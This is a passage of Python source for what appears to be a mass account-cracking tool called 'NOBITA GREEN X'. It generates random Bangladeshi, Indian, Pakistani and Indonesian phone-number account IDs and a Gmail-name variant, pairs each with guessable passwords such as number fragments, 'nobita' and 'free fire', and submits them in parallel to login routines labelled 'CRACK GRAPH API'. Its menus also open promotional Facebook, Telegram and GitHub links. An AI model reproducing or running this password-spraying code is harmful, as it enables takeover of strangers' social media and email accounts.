       os.system('xdg-open https://t.me/EMRANEHCCYBER99PYTHONCODING')
       gmail()
    if sh =='3':
       os.system('xdg-open https://t.me/EMRAN99EHCfree')
       _xnxx_()
    if sh =='4':
       os.system('xdg-open https://www.facebook.com/groups/2740586426083467/?ref=share')
       _xnxx_()
    if sh =='U':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100092161153653')
       check_update()
    elif sh =='00':
        os.system('xdg-open https://t.me/EMRANEHCCYBER99PYTHONCODING')
    else:
        os.system('xdg-open https://t.me/EMRAN99EHCfree')
        main()
        

#---------------------[MAIN CLONING DEF 2]---------------------#
def _pornhub_():
    os.system('clear')
    loading()
    os.system('clear')
    banner()
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}NOBITA GREEN X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}SHANTO HASAN')
    print(" ")
    print(f"{M}╔══[{H}1{M}] {GREEN}RANDOM BD ID CLONING{RED} (CHOICE) ")
    print(f"║══[{H}2{M}] {M}RANDOM INDIA CLONING{RED} (CHOICE) ")
    print(f"║══[{H}3{M}] {H}RANDOM PAK  CLONING{RED} (CHOICE) ")
    print(f"║══[{H}4{M}] {B}RANDOM INDONESIA CLONING{RED}(CHOICE)")
    print(f"║══[{H}F{M}] {BLACK}FOLLOW ME ON GITHUB{RED}[>/]")
    print(f"║══[{H}Y{M}] {RED}FOLLOW ME ON FB{RED} ")
    print(f"╚══[{H}U{M}] {M}UPDATE PROGRAMME ")
    sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if sh =='1':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       shbd()
    if sh =='2':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       shind()
    if sh =='3':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       shpak()
    if sh =='4':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       shindo()
    if sh =='F':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    if sh =='y':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    if sh =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif sh =='00':
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/Dark-Cyber-07')
        _pornhub_()
#__________________METHOD___________________#
def _pompom_():
    os.system('clear')
    loading()
    os.system('clear')
    banner()
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}NOBITA GREEN X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}SHANTO HASAN')
    print(" ")
    print(f"{M}╔══[{H}1{M}] {GREEN}CRACK SIMPLE API {RED} (CHOICE) ")
    print(f"║══[{H}2{M}] {M}CRACK  B API X-XX{RED} (CHOICE) ")
    print(f"║══[{H}3{M}] {H}CRACK GRAPH API{RED} (CHOICE) ")
    print(f"║══[{H}4{M}] {B}CRACK API X-XXRED(CHOICE)")
    print(f"║══[{H}F{M}] {BLACK}FOLLOW ME ON GITHUB{RED}[>/]")
    print(f"║══[{H}Y{M}] {RED}FOLLOW ME ON FB{RED} ")
    print(f"╚══[{H}U{M}] {M}UPDATE PROGRAMME ")
    

        
def _FUCKER_():
    os.system('clear')
    loading()
    os.system('clear')
    banner()
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}NOBITA GREEN X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}SHANTO HASAN')
    print(" ")
    print(f"{M}╔══[{H}1{M}] {COLOUR_X}CHOICE 6 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}2{M}] {COLOUR_X}CHOICE 7 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}3{M}] {COLOUR_X}CHOICE 8 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}4{M}] {COLOUR_X}CHOICE 9 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}5{M}] {COLOUR_X}CHOICE 10 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}6{M}] {COLOUR_X}CHOICE 11 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}7{M}] {COLOUR_X}CHOICE 12 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}8{M}] {COLOUR_X}CHOICE 13 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}9{M}] {COLOUR_X}CHOICE 14 DIGIT ID CLONING{RED} (TCW) ")
    print(f"║══[{H}F{M}] {COLOUR_X}FOLLOW ME ON GITHUB{RED}[>/]")
    print(f"║══[{H}Y{M}] {COLOUR_X}FOLLOW ME ON FB{RED} ")
    print(f"╚══[{H}U{M}] {M}UPDATE PROGRAMME ")
    
    
        






def shbd():
    _FUCKER_()
    pp = input(f' CHOOSE :{H} ')
    if pp =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pp =='00':
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/NOBITA-VIRUS-XD')
        _FUCKER_()
    _pompom_()       
    pom = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if pom =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pom =='00':
        _pompom_()
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/Dark-Cyber-07')
        _pompom_()
    user=[]
    
    os.getuid
    os.geteuid
    clear()
    banner()
    print(f"                 {H} BD  {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m BD CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}][{K}018{P}][{P}013{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m BD CODE: {P}[{H}011{P}][{B}014{P}][{K}015{P}][{K}013{P}][{P}012{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff ='+88'
    code = input(f' CHOOSE :{H} ')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD CP ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuu = input(f"{M}[+] [CHOOSE] : ")
    if somouuu in ['y','Y','1','yes','YES','Yes']:
       hello.append('y')
    else:
       hello.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD COOKIE  ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuuu = input(f"{M} [+] [CHOOSE] : ")
    if somouuuu in ['y','Y','1','yes','YES','Yes']:
       shanto.append('y')
    else:
       shanto.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/NOBITA/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}CHOOSE MORE PASS USE(,)COMA WITHOUT BRAKET')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f"")
    po = input(f"{M} [+] [CHOOSE] : ")
    pok = po.lower()
    os.system("clear")
    banner()
    print(f"")
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f"")
    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=60) as smiyaaa:    
        clear()
        banner()
        tl = str(len(user))
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {GREEN}WElCOME  MY TOOLS     : {RED}'+name)
        print(f'{M}║══[•] {GREEN}TOTAL IDZ             : {RED}'+tl)
        print(f'{M}║══[•] {GREEN}NUMBER YOU PUT        : {RED}'+code)
        print(f'{M}║══[•] {GREEN}PROCESS HAS BEEN STARTED')
        print(f'{M}╚══[•] {GREEN}TO STOP PROCESS Ctrl + Z ')
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love),  (xbook), (pok), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (xbook),  (pok), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (xbook), (pok), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('nobita'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
            elif pom =='3':
                smiyaaa.submit(b,uid,pwx,tl)
            elif pom =='4':
                smiyaaa.submit(u,uid,pwx,tl)
    sh = input(f'\n\n    {M}Go TO MAIN MENU [ Y/N] :{H}  ')
    if sh =='y':
        check_update()
    elif sh =='Y':
        check_update()
    else:
        main()
        
def shind():
    _FUCKER_()
    pp = input(f' CHOOSE :{H} ')
    if pp =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pp =='00':
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/NOBITA-VIRUS-XD')
        _FUCKER_()
    _pompom_()       
    pom = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if pom =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pom =='00':
        _pompom_()
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/Dark-Cyber-07')
        _pompom_()
    user=[]
    os.getuid
    os.geteuid
    clear()
    banner()
    print(f"                 {H}INDIA{K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m IND CODE: {P}[{H}905{P}][{B}975{P}][{K}755{P}][{K}855{P}][{P}954{P}][{K}897{P}]')
    print(f'   \033[1;92m IND CODE: {P}[{H}967{P}][{B}937{P}][{K}700{P}][{K}727{P}][{P}965{P}][{K}786{P}]')
    print(f'   \033[1;92m IND CODE: {P}[{H}874{P}][{B}856{P}][{K}566{P}][{K}590{P}][{P}527{P}][{K}568{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    ff = '+91'
    code = input(f'{M}    INPUT CODE {P}:{H} ')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD CP ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuu = input("[+] [CHOOSE] : ")
    if somouuu in ['y','Y','1','yes','YES','Yes']:
       hello.append('y')
    else:
       hello.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD COOKIE  ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuuu = input("{M} [+] [CHOOSE] : ")
    if somouuuu in ['y','Y','1','yes','YES','Yes']:
       shanto.append('y')
    else:
       shanto.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/NOBITA/DOREMON/OGGY')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}CHOOSE MORE PASS USE(,)COMA WITHOUT BRAKET')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    po = input(f' CHOOSE :{H} ')
    pok = po.lower()
    os.system("clear")
    banner()
    print(f"")
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f"")
    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=60) as smiyaaa:    
        clear()
        banner()
        tl = str(len(user))
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {GREEN}WElCOME  MY TOOLS     : {RED}'+name)
        print(f'{M}║══[•] {GREEN}TOTAL IDZ             : {RED}'+tl)
        print(f'{M}║══[•] {GREEN}NUMBER YOU PUT        : {RED}'+code)
        print(f'{M}║══[•] {GREEN}PROCESS HAS BEEN STARTED')
        print(f'{M}╚══[•] {GREEN}TO STOP PROCESS Ctrl + Z ')
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('57273200'), ('nobita'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('nobita'), ('57273200'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
            elif pom =='3':
                smiyaaa.submit(b,uid,pwx,tl)
            elif pom =='4':
                smiyaaa.submit(u,uid,pwx,tl)
    sh = input(f'\n\n    {M}Go TO MAIN MENU [ Y/N] :{H}  ')
    if sh =='y':
        check_update()
    elif sh =='Y':
        check_update()
    else:
        main()
        
    

def shpak():
    _FUCKER_()
    pp = input(f' CHOOSE :{H} ')
    if pp =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pp =='00':
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/NOBITA-VIRUS-XD')
        _FUCKER_()
    _pompom_()       
    pom = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if pom =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pom =='00':
        _pompom_()
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/Dark-Cyber-07')
        _pompom_()
    user=[]
    os.getuid
    os.geteuid
    clear()
    banner()
    print(f"                 {H} PAK {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}01{P}][{B}02{P}][{K}03{P}][{K}04{P}][{P}05{P}][{K}06{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}20{P}][{B}21{P}][{K}22{P}][{K}23{P}][{P}24{P}][{K}26{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}31{P}][{B}32{P}][{K}33{P}][{K}34{P}][{P}35{P}][{K}36{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}41{P}][{B}42{P}][{K}43{P}][{K}44{P}][{P}45{P}][{K}46{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}61{P}][{B}62{P}][{K}63{P}][{K}64{P}][{P}65{P}][{K}66{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    ff = '+923'
    code = input(f'{M}    INPUT CODE {P}:{H} ')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD CP ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuu = input("[+] [CHOOSE] : ")
    if somouuu in ['y','Y','1','yes','YES','Yes']:
       hello.append('y')
    else:
       hello.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD COOKIE  ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuuu = input("{M} [+] [CHOOSE] : ")
    if somouuuu in ['y','Y','1','yes','YES','Yes']:
       shanto.append('y')
    else:
       shanto.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/NOBITA/DOREMON/OGGY')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}CHOOSE MORE PASS USE(,)COMA WITHOUT BRAKET')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    po = input(f' CHOOSE :{H} ')
    pok = po.lower()
    os.system("clear")
    banner()
    print(f"")
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f"")
    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=60) as smiyaaa:    
        clear()
        banner()
        tl = str(len(user))
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {GREEN}WElCOME  MY TOOLS     : {RED}'+name)
        print(f'{M}║══[•] {GREEN}TOTAL IDZ             : {RED}'+tl)
        print(f'{M}║══[•] {GREEN}NUMBER YOU PUT        : {RED}'+code)
        print(f'{M}║══[•] {GREEN}PROCESS HAS BEEN STARTED')
        print(f'{M}╚══[•] {GREEN}TO STOP PROCESS Ctrl + Z ')
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('nobita'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
            elif pom =='3':
                smiyaaa.submit(b,uid,pwx,tl)
            elif pom =='4':
                smiyaaa.submit(u,uid,pwx,tl)
    sh = input(f'\n\n    {M}Go TO MAIN MENU [ Y/N] :{H}  ')
    if sh =='y':
        check_update()
    elif sh =='Y':
        check_update()
    else:
        main()
    
    
def shindo():
    _FUCKER_()
    pp = input(f' CHOOSE :{H} ')
    if pp =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pp =='00':
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/NOBITA-VIRUS-XD')
        _FUCKER_()
    _pompom_()       
    pom = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if pom =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pom =='00':
        _pompom_()
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/Dark-Cyber-07')
        _pompom_()
    user=[]
    
    os.getuid
    os.geteuid
    clear()
    banner()
    print(f"                 {H} INDONESIA {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m INDO CODE: {P}[{H}81{P}][{B}81{P}][{K}82{P}][{K}83{P}][{P}84{P}][{K}85{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m INDO CODE: {P}[{H}80{P}][{B}86{P}][{K}87{P}][{K}88{P}][{P}89{P}][{K}76{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = '+1'
    code = input(f'{M}    INPUT CODE {P}:{H} ')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD CP ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuu = input("[+] [CHOOSE] : ")
    if somouuu in ['y','Y','1','yes','YES','Yes']:
       hello.append('y')
    else:
       hello.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD COOKIE  ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuuu = input("{M} [+] [CHOOSE] : ")
    if somouuuu in ['y','Y','1','yes','YES','Yes']:
       shanto.append('y')
    else:
       shanto.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/NOBITA/DOREMON/OGGY')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}CHOOSE MORE PASS USE(,)COMA WITHOUT BRAKET')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    po = input(f' CHOOSE :{H} ')
    pok = po.lower()
    os.system("clear")
    banner()
    print(f"")
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f"")
    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=60) as smiyaaa:    
        clear()
        banner()
        tl = str(len(user))
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {GREEN}WElCOME  MY TOOLS     : {RED}'+name)
        print(f'{M}║══[•] {GREEN}TOTAL IDZ             : {RED}'+tl)
        print(f'{M}║══[•] {GREEN}NUMBER YOU PUT        : {RED}'+code)
        print(f'{M}║══[•] {GREEN}PROCESS HAS BEEN STARTED')
        print(f'{M}╚══[•] {GREEN}TO STOP PROCESS Ctrl + Z ')
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('nobita'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('nobita'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
            elif pom =='3':
                smiyaaa.submit(b,uid,pwx,tl)
            elif pom =='4':
                smiyaaa.submit(u,uid,pwx,tl)
    sh = input(f'\n\n    {M}Go TO MAIN MENU [ Y/N] :{H}  ')
    if sh =='y':
        check_update()
    elif sh =='Y':
        check_update()
    else:
        main()

        
def gmail():
    _pompom_()       
    pom = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if pom =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pom =='00':
        _pompom_()
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/Dark-Cyber-07')
        _pompom_()
    user=[]
    
    os.getuid
    os.geteuid
    clear()
    banner()
    print(f"                 {H} GMAIL {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}SHANTO{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
    os.system("clear")
    banner()
    print(f"                 {H} GMAIL {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}HASAN{P}][{B}RANA{P}][{K}AHMED{P}][{K}MAHMUD{P}]')
